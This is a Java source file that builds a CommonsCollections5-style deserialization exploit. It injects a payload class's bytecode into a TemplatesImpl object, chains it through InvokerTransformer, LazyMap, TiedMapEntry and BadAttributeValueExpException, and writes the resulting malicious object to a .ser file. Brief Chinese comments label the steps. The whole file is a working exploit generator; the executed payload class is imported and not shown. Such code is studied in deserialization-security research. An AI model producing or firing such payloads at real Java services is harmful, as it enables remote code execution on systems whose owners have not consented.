package CommonsCollections5;

import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class exp2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, CannotCompileException, NotFoundException {
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload类
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]{payCode});
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");

       InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,trans);
        //构造外部的触发链
        TiedMapEntry entry = new TiedMapEntry(innerMap, tmp);

        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry);

        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5-2.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(val);

    }
}
